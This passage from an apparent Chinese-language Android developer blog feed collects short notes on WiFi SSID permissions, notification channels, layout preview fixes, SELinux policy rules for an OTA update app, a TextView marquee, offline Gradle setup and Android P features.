<p>如果需要App进入后台时依然能获取到WiFi信息，需要增加一条动态权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android.permission.ACCESS_BACKGROUND_LOCATION</span><br></pre></td></tr></table></figure>
<p>没有这个权限，进入后台，WifiManager获取到的SSID值是 <code>&lt;unknown ssid&gt;</code> ，在后台时间长或者频繁获取WiFi信息，也会SSID值是 <code>&lt;unknown ssid&gt;</code> 。</p>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>不要再从广播里面获取SSID，调用 <code>WifiManager</code> 的 <code>getConnectionInfo()</code> 函数，注意先请求申请权限。<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> mWifiManager = context?.getSystemService(WifiManager::<span class="class"><span class="keyword">class</span>.<span class="title">java</span>)</span></span><br><span class="line"><span class="keyword">val</span> ssid = mWifiManager?.connectionInfo?.ssid</span><br><span class="line">Log.e(TAG, <span class="string">"mWifiManager = <span class="variable">$ssid</span>"</span>)</span><br></pre></td></tr></table></figure></p>
<p>另外，还需要在设备上启用位置服务（在 <strong>Settings &gt; Location</strong> 下）。</p>
<h3 id="监听网络"><a href="#监听网络" class="headerlink" title="监听网络"></a>监听网络</h3><ol>
<li>订阅系统广播（规范）</li>
<li>启动一个Timer检查（方便简单，但不可靠）,时间长会获取不到SSID值。</li>
</ol>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android Notifications通知兼容性</title>
    <url>/Android/Android%20Notifications%E9%80%9A%E7%9F%A5%E5%85%BC%E5%AE%B9%E6%80%A7/</url>
    <content><![CDATA[<ul>
<li><p><a href="https://developer.android.google.cn/guide/topics/ui/notifiers/notifications" target="_blank" rel="noopener">notifications docs</a></p>
</li>
<li><p><a href="https://developer.android.google.cn/guide/topics/ui/notifiers/notifications#compatibility" target="_blank" rel="noopener">notifications 兼容性</a></p>
</li>
</ul>
<p>请尽量使用：NotificationCompat 及其子类，以及 NotificationManagerCompat。<br>这样一来，您就无需编写条件代码来检查 API 级别，因为这些 API 会为您代劳。<br>但是要注意 NotificationManagerCompat 不能创建Android8.0以上所需要的Channel，创建Channel还是需要用NotificationManager。</p>
<h2 id="简单的一个通知"><a href="#简单的一个通知" class="headerlink" title="简单的一个通知"></a>简单的一个通知</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String channelId = <span class="string">"news"</span>;</span><br><span class="line">   NotificationCompat.Builder builder = <span class="keyword">new</span> NotificationCompat.Builder(getApplicationContext(),</span><br><span class="line">           channelId)</span><br><span class="line">           .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class="line">           .setContentTitle(<span class="string">"测试Title"</span>)</span><br><span class="line">           .setContentText(<span class="string">"一些简单的内容！！！"</span>);</span><br><span class="line"></span><br><span class="line">   NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> notifyId = <span class="number">123</span>;</span><br><span class="line">   notificationManager.notify(notifyId, builder.build());</span><br></pre></td></tr></table></figure>
<p>但这个通知在Android8.0不能发出去，因为8.0规定必须将单个通知放入特定Channel中。</p>
<h2 id="兼容Android8-0的通知"><a href="#兼容Android8-0的通知" class="headerlink" title="兼容Android8.0的通知"></a>兼容Android8.0的通知</h2><p>先 <a href="https://developer.android.google.cn/training/notify-user/channels" target="_blank" rel="noopener">创建 NotificationChannel</a> ，才能发出 Notification 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NotificationManager manager = (NotificationManager) context.getSystemService(</span><br><span class="line">       Context.NOTIFICATION_SERVICE);</span><br><span class="line">   String channelId = String.valueOf(notifyId);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">       <span class="comment">// 创建Channel</span></span><br><span class="line">       NotificationChannel channel = <span class="keyword">new</span> NotificationChannel(channelId, <span class="string">"警报通知"</span>,</span><br><span class="line">               NotificationManager.IMPORTANCE_HIGH);</span><br><span class="line">       channel.enableLights(<span class="keyword">true</span>);</span><br><span class="line">       channel.setLightColor(ContextCompat.getColor(context, R.color.notifyChannel));</span><br><span class="line">       channel.setShowBadge(<span class="keyword">true</span>);</span><br><span class="line">       channel.setDescription(<span class="string">"警报"</span>);</span><br><span class="line">       manager.createNotificationChannel(channel);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   NotificationCompat.Builder mBuilder = <span class="keyword">new</span> NotificationCompat.Builder(context, channelId);</span><br><span class="line">   mBuilder.setContentTitle(title)</span><br><span class="line">           .setContentText(msg)</span><br><span class="line">           <span class="comment">//这张图显示在右边，原图显示</span></span><br><span class="line">           .setLargeIcon(BitmapFactory.decodeResource(context.getResources(), R.drawable.notification_image))</span><br><span class="line">           .setOnlyAlertOnce(<span class="keyword">true</span>)</span><br><span class="line">           .setDefaults(Notification.DEFAULT_ALL)</span><br><span class="line">           .setWhen(System.currentTimeMillis())</span><br><span class="line">           <span class="comment">//这有一种颜色 + 透明部分</span></span><br><span class="line">           .setSmallIcon(R.drawable.notification_icon)</span><br><span class="line">           .setColor(ContextCompat.getColor(context, R.color.notifySmallIcon));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   mBuilder.setAutoCancel(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 用 NotificationManager 发通知</span></span><br><span class="line">   <span class="comment">// manager.notify(notifyId, mBuilder.build());</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 用 NotificationManagerCompat 发通知兼容性更好</span></span><br><span class="line">   NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);</span><br><span class="line">   notificationManager.notify(notifyId, mBuilder.build());</span><br></pre></td></tr></table></figure>
<p>notification_icon<br><img src="/images/android/notification_icon.png" alt="notification_icon"></p>
<p>notification_image<br><img src="/images/android/notification_image.jpg" alt="notification_image"></p>
<h2 id="Genymotion模拟器显示效果"><a href="#Genymotion模拟器显示效果" class="headerlink" title="Genymotion模拟器显示效果"></a>Genymotion模拟器显示效果</h2><p>这里不测试国内的定制 ROM 效果，每个ROM都有自己的优化。</p>
<h4 id="1-Android-4-4（API-级别-19-和-20）"><a href="#1-Android-4-4（API-级别-19-和-20）" class="headerlink" title="1. Android 4.4（API 级别 19 和 20）"></a>1. Android 4.4（API 级别 19 和 20）</h4><p><img src="/images/android/通知4.4.png" alt="通知4.4"></p>
<h4 id="2-Android-5-0（API-级别-21）"><a href="#2-Android-5-0（API-级别-21）" class="headerlink" title="2. Android 5.0（API 级别 21）"></a>2. Android 5.0（API 级别 21）</h4><ul>
<li>setSmallIcon的图标是镂空的，单色。</li>
<li>引入了锁定屏幕和浮动通知。</li>
<li>向 API 集添加了通知是否在锁定屏幕上显示的方法 (setVisibility())，以及指定通知文本的“公开”版本的方法。</li>
</ul>
<p>单色Icon示例，白色部分是透明<br><img src="/images/android/notification_icon.png" alt="setSmallIcon"></p>
<h4 id="2-Android-6-0（API-级别-23）"><a href="#2-Android-6-0（API-级别-23）" class="headerlink" title="2. Android 6.0（API 级别 23）"></a>2. Android 6.0（API 级别 23）</h4><p><img src="/images/android/通知6.0.png" alt="通知6.0"></p>
<h4 id="3-Android-7-0（API-级别-24）"><a href="#3-Android-7-0（API-级别-24）" class="headerlink" title="3. Android 7.0（API 级别 24）"></a>3. Android 7.0（API 级别 24）</h4><ul>
<li>重新设计了通知模板的样式，以强调主打图像和头像。</li>
</ul>
<p><img src="/images/android/通知7.1.png" alt="通知7.1"></p>
<h4 id="4-Android-8-0（API-级别-26）"><a href="#4-Android-8-0（API-级别-26）" class="headerlink" title="4. Android 8.0（API 级别 26）"></a>4. Android 8.0（API 级别 26）</h4><ul>
<li>现在必须将单个通知放入特定渠道中。</li>
<li>用户现在可以按渠道关闭通知，而不是关闭应用的所有通知。</li>
</ul>
<p><img src="/images/android/通知8.0.png" alt="通知8.0"></p>
<h4 id="4-Android-9-0（API-级别-28）"><a href="#4-Android-9-0（API-级别-28）" class="headerlink" title="4. Android 9.0（API 级别 28）"></a>4. Android 9.0（API 级别 28）</h4><p><img src="/images/android/通知9.0.png" alt="通知9.0"></p>
<h2 id="从通知启动-Activity"><a href="#从通知启动-Activity" class="headerlink" title="从通知启动 Activity"></a>从通知启动 Activity</h2><p><a href="https://developer.android.google.cn/training/notify-user/navigation" target="_blank" rel="noopener">docs</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>通知,notify</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Preview空白</title>
    <url>/Android/Android%20Preview%E7%A9%BA%E7%99%BD/</url>
    <content><![CDATA[<p>工程 <code>compileSdkVersion 28</code>，<code>preview</code> 一片空白，无法预览布局，降低 <code>sdk</code> 版本也不行。</p>
<p>点击旁边的 <code>红色圆点叹号</code>，出现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Failed to load AppCompat ActionBar with unknown error.</span><br></pre></td></tr></table></figure>
<p>应该是 <code>ActionBar</code> 出了问题，按照以下修改可预览：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"AppTheme"</span> <span class="attr">parent</span>=<span class="string">"Theme.AppCompat.Light.DarkActionBar"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>改为<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"AppTheme"</span> <span class="attr">parent</span>=<span class="string">"Base.Theme.AppCompat.Light.DarkActionBar"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"AppTheme"</span> <span class="attr">parent</span>=<span class="string">"Theme.AppCompat.Light.NoActionBar"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android Ndk课程</title>
    <url>/Android/Android%20Ndk%E8%AF%BE%E7%A8%8B/</url>
    <content><![CDATA[<p><a href="https://ke.qq.com/course/130901" target="_blank" rel="noopener">https://ke.qq.com/course/130901</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>Android SELinux权限匹配</title>
    <url>/Android/Android%20SELinux%E6%9D%83%E9%99%90%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<p>在做Android 系统OTA升级App时，需要在 ‘<code>/cache</code>‘ 目录创建目录和脚本文件，App已经获取到system权限（安装到 <code>/system/priv-app</code> 目录），但是还是在<code>/cache</code> 目录下没有权限。</p>
<p>通过 <code>adb</code> 命令，用system身份执行命令都没有任何问题。</p>
<p>升级命令脚本是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;mkdir /cache/recovery&quot;</span><br><span class="line">&quot;echo \&quot;--update_package=/data/update.zip\&quot; &gt; /cache/recovery/command&quot;</span><br><span class="line">reboot recovery</span><br></pre></td></tr></table></figure></p>
<p>但建议调用Android的接口 <code>RecoverySystem.installPackage(this,new File(&quot;/data/update.zip&quot;));</code> 执行（也是差不多这些命令）</p>
<p>通过 <code>adb logcat</code> 抓到关键日志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  436.020771] type=1400 audit(1590734406.224:28): avc: denied &#123; write &#125; for pid=7767 comm=&quot;com.github.test&quot; name=&quot;recovery&quot; dev=&quot;mmcblk0p23&quot; ino=8197 scontext=u:r:system_app:s0 tcontext=u:object_r:cache_file:s0 tclass=dir permissive=0</span><br></pre></td></tr></table></figure>
<p>这就是SELinux拦截的日志。</p>
<p>进入 <code>adb shell</code> 看一下SELinux对cache目录拦截的属性</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@la0920:/ <span class="comment"># ls -Z | grep cache</span></span><br><span class="line">drwxrwx--- system   cache             u:object_r:cache_file:s0 cache</span><br><span class="line">root@la0920:/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>要确定是不是SELinux导致这个问题，简单测试一下，临时关闭SELinux</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell setenforce 0</span><br></pre></td></tr></table></figure>
<p>如果确定问题了，那就要根据报错日志，匹配一条记录</p>
<p>[  436.020771] type=1400 audit(1590734406.224:28): avc: denied { <code>write</code> } for pid=7767 comm=”com.github.test” name=”recovery” dev=”mmcblk0p23” ino=8197 scontext=u:r:<code>system_app</code>:s0 tcontext=u:object_r:<code>cache_file</code>:s0 tclass=<code>dir</code> permissive=0</p>
<ul>
<li>缺少什么权限：      { execute}权限，</li>
<li>谁缺少权限：        scontext = u:r:platform_app:s0</li>
<li>对哪个文件缺少权限：tcontext = u:object_r:app_data_file</li>
<li><p>什么类型的文件：    tclass= file</p>
</li>
<li><p>avc: denied { write } </p>
</li>
<li>for pid=7767 comm=”com.github.test” name=”recovery” dev=”mmcblk0p23” </li>
<li>ino=8197</li>
<li>scontext=u:r:system_app:s0 </li>
<li>tcontext=u:object_r:cache_file:s0 </li>
<li>tclass=dir </li>
</ul>
<p>根据<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow scontext tcontext:tclass denied;</span><br></pre></td></tr></table></figure></p>
<p>得出一条记录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow system_app cache_file:dir write;</span><br></pre></td></tr></table></figure></p>
<p>在Android Framwork 源码路径： <code>external/sepolicy/*.te</code> 找了相关的scontext文件，如 system_app.te，在 <code>external/sepolicy/system_app.te</code> 这个文件加入这条记录。</p>
<p>重新编译。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>SELinux,Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android TextView跑马灯</title>
    <url>/Android/Android%20TextView%E8%B7%91%E9%A9%AC%E7%81%AF/</url>
    <content><![CDATA[<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/tv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"你好测试用例啊啊啊啊啊"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fontFamily</span>=<span class="string">"@font/square_pixel_16"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"200sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:singleLine</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:scrollHorizontally</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusable</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusableInTouchMode</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:marqueeRepeatLimit</span>=<span class="string">"marquee_forever"</span>/&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>tv</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio 离线安装Gradle</title>
    <url>/Android/Android%20Studio%20%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85Gradle/</url>
    <content><![CDATA[<p><code>Android Studio</code> 下载 <code>gradle</code> 一直很慢，或者是根本下载不了，而通过手动下载，则快很多。</p>
<p>以 <code>gradle5.4.1</code> 为例</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://downloads.gradle-dn.com/distributions/gradle-5.4.1-all.zip" target="_blank" rel="noopener">gradle-5.4.1-all.zip</a></p>
<h2 id="放置zip包"><a href="#放置zip包" class="headerlink" title="放置zip包"></a>放置zip包</h2><p>到 <code>.gradle</code> 目录下，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\kevin\.gradle\wrapper\dists\gradle-5.4.1-all</span><br></pre></td></tr></table></figure></p>
<ul>
<li>如果AS已经创建了类似 <code>12112jdfhdhuhudshfsrwx</code> 这种目录，则需要将zip包拷贝到这个目录下。</li>
<li>否则，直接放在 <code>dists\gradle-5.4.1-all</code> 目录下。</li>
<li>注意zip包不需要解压</li>
</ul>
<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><p>直接重启 <code>Android Studio</code> 或者点 <code>Sysc GRadle Files</code> 进行安装。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Gradle</tag>
      </tags>
  </entry>
  <entry>
    <title>Android P(9.0) 功能和 API</title>
    <url>/Android/Android%20P(9.0)%20%E5%8A%9F%E8%83%BD%E5%92%8C%20API/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://developer.android.google.cn/preview/features" target="_blank" rel="noopener">原文</a><br>Android P 为用户和开发者引入众多新特性和新功能。</p>
</blockquote>
<p>本文重点介绍面向开发者的新功能。 要了解新 API，请阅读 API 差异报告或访问 Android API 参考 — 为醒目起见，将突出显示新 API。 请务必查阅 Android P 行为变更以了解平台变更可能给您的应用带来哪些方面的影响。</p>
<h4 id="利用-Wi-Fi-RTT-进行室内定位"><a href="#利用-Wi-Fi-RTT-进行室内定位" class="headerlink" title="利用 Wi-Fi RTT 进行室内定位"></a>利用 Wi-Fi RTT 进行室内定位</h4><p>Android P 添加了对 IEEE 802.11mc Wi-Fi 协议（也称为 Wi-Fi Round-Trip-Time (RTT)）的平台支持，从而让您的应用可以利用室内定位功能。<br>在提供硬件支持的 Android P 设备上，应用可以使用全新的 RTT API 来测量与附近支持 RTT 的 Wi-Fi 接入点 (AP) 的距离。 设备必须已启用定位并开启了 Wi-Fi 扫描（在 Settings &gt; Location 下），同时您的应用必须具有 ACCESS_FINE_LOCATION 权限。 设备不需要连接至 AP 即可使用 RTT。 为保证隐私性，只有手机可以确定与 AP 的距离；AP 不具备该信息。</p>
<p>如果您的设备测量与 3 个或更多 AP 的距离，您可以使用一个多点定位算法来预估与这些测量值最相符的设备位置。 结果通常精准至 1 至 2 米。</p>
<p>通过这种精确性，您可以打造新的体验，例如楼内导航、基于精细位置的服务，如无歧义语音控制（例如，“打开这盏灯”），以及基于位置的信息（如 “此产品是否有特别优惠？”）。</p>
<h4 id="屏幕缺口支持-刘海屏"><a href="#屏幕缺口支持-刘海屏" class="headerlink" title="屏幕缺口支持(刘海屏)"></a>屏幕缺口支持(刘海屏)</h4><p><img src="https://developer.android.google.cn/preview/images/emulator-devoptions-cutout_2x.png" alt><br>Android P 支持最新的全面屏以及为摄像头和扬声器预留空间的凹口屏幕。 通过全新的 DisplayCutout 类，可以确定非功能区域的位置和形状，这些区域不应显示内容。 要确定这些凹口屏幕区域是否存在及其位置，请使用 getDisplayCutout() 函数。</p>
<p>您可以按如下方法在任何运行 Android P 的设备或模拟器上模拟屏幕缺口：</p>
<pre><code>1. 启用开发者选项。
2. 在 Developer options 屏幕中，向下滚动至 Drawing 部分并选择 Simulate a display with a cutout。
3. 选择凹口屏幕的大小。
</code></pre><p>注：我们建议您通过使用运行 Android P 的设备或模拟器测试凹口屏幕周围的内容显示。</p>
<h4 id="通知"><a href="#通知" class="headerlink" title="通知"></a>通知</h4><p>Android P 引入了多个通知增强功能，可供以 Android P 及更高版本作为目标平台的开发者使用。<br>从 Android 7.0（API 级别 24）开始，您可以添加一个操作以回复短信或直接从通知中输入其他文本。</p>
<h4 id="渠道设置、广播和请勿打扰"><a href="#渠道设置、广播和请勿打扰" class="headerlink" title="渠道设置、广播和请勿打扰"></a>渠道设置、广播和请勿打扰</h4><p>Android O 引入了通知渠道，从而允许您为要显示的每种通知类型创建可由用户自定义的渠道。</p>
<h4 id="多摄像头支持和摄像头更新"><a href="#多摄像头支持和摄像头更新" class="headerlink" title="多摄像头支持和摄像头更新"></a>多摄像头支持和摄像头更新</h4><p>现在，在运行 Android P 的设备上，您可以通过两个或更多物理摄像头来同时访问多个视频流。 在配备双前置摄像头或双后置摄像头的设备上，您可以创建只配备单摄像头的设备所不可能实现的创新功能，例如无缝缩放、虚化和立体成像。 通过此 API，您还可以调用逻辑或融合的摄像头视频流，该视频流可在两个或更多摄像头之间自动切换。</p>
<p>摄像头方面的其他改进还包括新的会话参数和 Surface 共享，前者有助于降低首次拍照期间的延迟，而后者则让摄像头客户端能够处理各种用例，而无需停止并启动摄像头视频流。 我们还针对基于显示屏的 flash 支持和 OIS 时间戳访问新增了一些 API，用以实现应用级的图像稳定化和特效。</p>
<p>在受支持的设备上，Android P 还支持外置 USB/UVC 摄像头。</p>
<h4 id="适用于位图和可绘制对象的-ImageDecoder"><a href="#适用于位图和可绘制对象的-ImageDecoder" class="headerlink" title="适用于位图和可绘制对象的 ImageDecoder"></a>适用于位图和可绘制对象的 ImageDecoder</h4><p>Android P 引入 ImageDecoder ，以提供现代化的图像解码方法。 您应使用 ImageDecoder 来解码图像，而不是使用 BitmapFactory 和 BitmapFactory.Options API。</p>
<p>ImageDecoder 让您可以从字节缓冲区、文件或 URI 来创建 Drawable 或 Bitmap。 要解码图像，请首先以编码图像的来源为参数，调用 createSource()。 然后，通过传递 ImageDecoder.Source 对象来调用 decodeBitmap() 或 decodeDrawable() ，从而创建 Bitmap或 Drawable。 要更改默认设置，请将 OnHeaderDecodedListener 传递给 decodeBitmap() 或 decodeDrawable()。 ImageDecoder 以图像的默认宽度和高度（若已知的话）为参数，调用onHeaderDecoded()。 如果编码图像是动画 GIF 或 WebP，decodeDrawable() 将返回 Drawable，后者是 AnimatedImageDrawable 类的一个实例。</p>
<p>您可以使用不同的方法来设置图像属性。 这些方法包括：</p>
<ul>
<li>要将解码的图像缩放到精确尺寸，请以目标尺寸为参数，调用 setResize()。 您也可以使用样图尺寸来缩放图像。 将样图尺寸直接传递给 setResize()，或者调用getSampledSize() 以查看 ImageDecoder 能够最高效地获取何种尺寸的样图。</li>
<li>要在缩放图像的范围内裁剪图像，请调用 setCrop()。</li>
<li>要创建可变的 Bitmap，请调用 setMutable(true)。</li>
</ul>
<p>通过 ImageDecoder，您还可以为圆角或圆形遮罩之类的图像添加复杂的定制效果。 以 PostProcessor 类的一个实例作为参数，使用 setPostProcessor() 来执行您希望绘制命令执行的任何工作。 当您对 AnimatedImageDrawable 进行后处理时，这些效果会作用与所有框。</p>
<h4 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h4><p>Android P 引入了一个新的 AnimatedImageDrawable 类，用于绘制和显示 GIF 和 WebP 动画图像。 AnimatedImageDrawable 的工作方式 AnimatedVectorDrawable 的相似之处在于，都是 RenderThread 驱动 AnimatedImageDrawable 的动画。 RenderThread 还使用工作线程进行解码，因此，解码不会干扰 RenderThread。 这种实现机制允许您的应用在使用动画图像时不必管理其更新，也不会干扰应用的界面线程。</p>
<p>可使用新的 ImageDecoder 解码 AnimagedImageDrawable。 以下代码段演示如何使用 ImageDecoder 来解码 AnimatedImageDrawable：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Drawable d = ImageDecoder.decodeDrawable(...);</span><br><span class="line">if (d instanceof AnimatedImageDrawable) &#123;</span><br><span class="line">    ((AnimatedImageDrawable) d).start();   // Prior to start(), the first frame is displayed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ImageDecoder 有几种方法可用来进一步修改图像。 例如，您可以使用 setPostProcessor() 函数来修改图像的外观，例如应用圆形遮罩或圆角。</p>
<h4 id="HDR-VP9-视频、HEIF-图像压缩和-Media-API"><a href="#HDR-VP9-视频、HEIF-图像压缩和-Media-API" class="headerlink" title="HDR VP9 视频、HEIF 图像压缩和 Media API"></a>HDR VP9 视频、HEIF 图像压缩和 Media API</h4><p>Android P 新增对 High Dynamic Range (HDR) VP9 Profile 2 的内置支持，因此，现在您可以在支持 HDR 的设备上为用户提供来自 YouTube、Play Movies 和其他来源的采用 HDR 的影片。</p>
<p>Android P 为平台增加了对 HEIF (heic) 图像编码的支持。 MediaMuxer 和 MediaExtractor 类中可支持 HEIF 静态图像示例 HEIF 改进了压缩，可节省存储空间和网络数据流量。 借助 Android P 设备上的平台支持，从后端服务器发送和使用 HEIF 图像轻而易举。 确保应用兼容这种便于共享和显示的数据格式后，尝试在应用中使用 HEIF 作为图像存储格式。 您可以使用 ImageDecoder 或 BitmapFactory 进行 jpeg 到 heicto 的转换，以通过 jpeg 获取位图，并且可以使用全新支持库 alpha 版中的 HeifWriter 编写来自 YUV 字节缓冲区、Surface 或 Bitmap 的 HEIF 静态图像。</p>
<p>另外，Android P 还引入了 MediaPlayer2。 此播放器支持使用 DataSourceDesc 构建的播放列表。 要创建 MediaPlayer2 的实例，请使用 MediaPlayer2.create()。</p>
<p>现在，还可通过 AudioTrack、AudioRecord 和 MediaDrm 类获取媒体指标。</p>
<p>Android P 向 MediaDRM 类添加了新函数以获取指标、高带宽数字内容保护 (HDCP) 级别、安全级别和会话数，并对安全性级别和安全停止进行更多控制。 如需了解更多详情，请参阅 API 差异报告。</p>
<h4 id="JobScheduler-中的数据成本敏感度"><a href="#JobScheduler-中的数据成本敏感度" class="headerlink" title="JobScheduler 中的数据成本敏感度"></a>JobScheduler 中的数据成本敏感度</h4><p>Android P 中对 JobScheduler 进行了改进，使其可以更好地为用户处理网络相关的作业，从而与运营商独立提供的网络状态信号相协调。</p>
<p>现在，作业可以声明其预估的数据大小、信号预提取，并指定具体的网络要求，而运营商可以报告网络拥塞或无限流量。 然后，JobScheduler 根据网络状态管理工作。 例如，当网络拥塞时，JobScheduler 可能会延迟较大的网络请求。 如果使用的是无限流量网络，则 JobScheduler 可运行预提取作业以提升用户体验（例如预提取标题）。</p>
<p>添加作业时，确保使用 setEstimatedNetworkBytes()、setIsPrefetch() 和 setRequiredNetwork()（如果适用），以帮助 JobScheduler 正确处理工作。 在执行作业时，请确保使用 JobParameters.getNetwork() 返回的 Network 对象。 否则，您将隐式使用设备的默认网络，其可能不符合您的要求，从而导致意外的流量消耗</p>
<h4 id="Neural-Networks-API-1-1"><a href="#Neural-Networks-API-1-1" class="headerlink" title="Neural Networks API 1.1"></a>Neural Networks API 1.1</h4><p>Android 8.1（API 级别 27）中引入了 Neural Networks API 以加快 Android 设备上机器学习的速度。 Android P 扩展并改进了该 API，从而增加了对 Pad、BatchToSpaceND、SpaceToBatchND、Transpose、Strided Slice、Mean、Div、Sub 和 Squeeze 九个新运算的支持。</p>
<h4 id="自动填充框架"><a href="#自动填充框架" class="headerlink" title="自动填充框架"></a>自动填充框架</h4><p>Android 8.0（API 级别 26）引入了自动填充框架，简化了应用中的表单填写。 Android P 引入了多项改进，自动填充服务可以利用这些改进进一步增强用户填写表单时的体验。 如需了解更多详情，请参阅自动填充框架页面。</p>
<h4 id="安全增强功能"><a href="#安全增强功能" class="headerlink" title="安全增强功能"></a>安全增强功能</h4><p>Android P 引入了许多新的安全功能，包括统一的指纹身份验证对话框和针对敏感交易的高可信度用户确认。 如需了解更多详情，请参阅安全性更新页面。</p>
<h4 id="Android-备份的客户端加密"><a href="#Android-备份的客户端加密" class="headerlink" title="Android 备份的客户端加密"></a>Android 备份的客户端加密</h4><p>Android P 支持使用客户端密钥加密 Android 备份。 由于此隐私措施，在从用户设备制作的备份恢复数据时，会要求提供设备的 PIN 码、图案或密码。 如需详细了解这项新功能背后的技术，请参阅 Google 云密钥保险柜服务白皮书。</p>
<h4 id="无障碍功能窗格标题"><a href="#无障碍功能窗格标题" class="headerlink" title="无障碍功能窗格标题"></a>无障碍功能窗格标题</h4><p>在 Android P 之前，无障碍服务无法轻松确定屏幕的某个区域是否经过更新，例如在 Fragment 过渡期间。</p>
<p>在 Android P 中，各个窗格区域的标题现在采用 accessibility pane titles 的格式。 无障碍服务可以收到这些标题的变更，从而能够提供关于所做变更的更精细信息。</p>
<p>要指定某个区域的标题，请使用新的 android:accessibilityPaneTitle 属性。 您也可以更新您在运行时使用 setAccessibilityPaneTitle() 替换的某个界面区域的标题。 例如，您可以为某个 Fragment 对象的内容区域提供标题。</p>
<h4 id="基于标题的导航"><a href="#基于标题的导航" class="headerlink" title="基于标题的导航"></a>基于标题的导航</h4><p>如果您的应用显示的内容包含具有逻辑含义的标题，则对于表示这些标题的 View 实例，将新的 android:accessibilityHeading 属性设置为 true。 这样，用户可以从一个标题导航至下一个标题。 在用户操作屏幕阅读器时，这种导航过程尤其方便。</p>
<h4 id="便捷操作"><a href="#便捷操作" class="headerlink" title="便捷操作"></a>便捷操作</h4><p>Android P 新增了一些方便用户执行操作的支持功能：</p>
<p>访问提示： 无障碍框架中的新功能让您可在应用界面中访问提示。 使用 getTooltipText() 读取提示文本，使用新的 ACTION_SHOW_TOOLTIP 和 ACTION_HIDE_TOOLTIP 来指示 View 的实例显示或隐藏提示。</p>
<p>新的全局操作： Android P 在 AccessibilityService 类中引入了对两个新设备操作的支持。 您的 Service 现在可以帮助用户分别使用 GLOBAL_ACTION_LOCK_SCREEN 和 GLOBAL_ACTION_TAKE_SCREENSHOT 操作锁定其设备并进行屏幕截图。</p>
